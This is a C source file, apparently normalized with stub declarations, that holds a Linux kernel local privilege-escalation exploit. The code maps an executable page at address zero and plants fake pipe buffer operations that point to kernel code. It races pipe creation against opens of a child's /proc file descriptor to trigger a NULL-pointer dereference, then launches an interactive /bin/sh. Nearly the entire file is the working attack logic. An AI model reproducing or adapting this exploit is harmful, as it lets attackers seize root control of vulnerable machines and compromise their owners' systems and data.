#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct pseudo_pipe_inode_info {TYPE_1__* bufs; scalar_t__ writers; scalar_t__ readers; } ;
struct pipe_buf_operations {int** ops; } ;
struct TYPE_2__ {struct pipe_buf_operations* ops; } ;

/* Variables and functions */
 int MAP_ANONYMOUS ; 
 int MAP_FIXED ; 
 int MAP_PRIVATE ; 
 int /*<<< orphan*/  O_RDWR ; 
 int PIPE_BUFFERS ; 
 int PROT_EXEC ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  execl (char*,char*,char*,int /*<<< orphan*/ *) ; 
 int fork () ; 
 int /*<<< orphan*/  getgid () ; 
 int getpid () ; 
 int /*<<< orphan*/  getuid () ; 
 int /*<<< orphan*/  gid ; 
 int /*<<< orphan*/  is_done (int /*<<< orphan*/ ) ; 
 scalar_t__ kernel_code ; 
 char* mmap (int /*<<< orphan*/ ,int,int,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int open (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int pipe (int*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  setresgid (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  setresuid (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sprintf (char*,char*,int) ; 
 int /*<<< orphan*/  uid ; 

int main(int ac, char **av)
{
	int fd[2];
	int pid;
	int parent_pid = getpid();
	char *buf;
	int i,j;
	struct pseudo_pipe_inode_info 	*pinfo = 0;
	struct pipe_buf_operations	ops;	

	buf = mmap(0, 0x1000, PROT_READ | PROT_EXEC | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, 0, 0); 

	printf ("buf: %p\n", buf);

	pinfo->readers = 0;
	pinfo->writers = 0;

	for (i = 0; i < 10; i++)
		ops.ops[i] = (int *)kernel_code;

	for (i = 0; i < PIPE_BUFFERS; i++)
	{
		pinfo->bufs[i].ops = &ops;
	}

	i = 0;


	uid = getuid();
	gid = getgid();
	setresuid(uid, uid, uid);
	setresgid(gid, gid, gid);
	//while (1) 
	{
		pid = fork();
		if (pid == -1)
		{
			perror("fork");
			return (-1);
		}
		if (pid)
		{
			char path[1024];
			char c;
			/* I assume next opened fd will be 4 */
			sprintf(path, "/proc/%d/fd/4", pid);
		        printf("Parent: %d\nChild: %d\n", parent_pid, pid);	
			while (!is_done(0))
			{
				fd[0] = open(path, O_RDWR);
				if (fd[0] != -1)
				{
					close(fd[0]);
				}
			}
			//system("/bin/sh");
			execl("/bin/sh", "/bin/sh", "-i", NULL);
			return (0);
		}
	
		while (!is_done(0))
		{
			if (pipe(fd) != -1)
			{
				close(fd[0]);
				close(fd[1]);
			}
		}
	}
}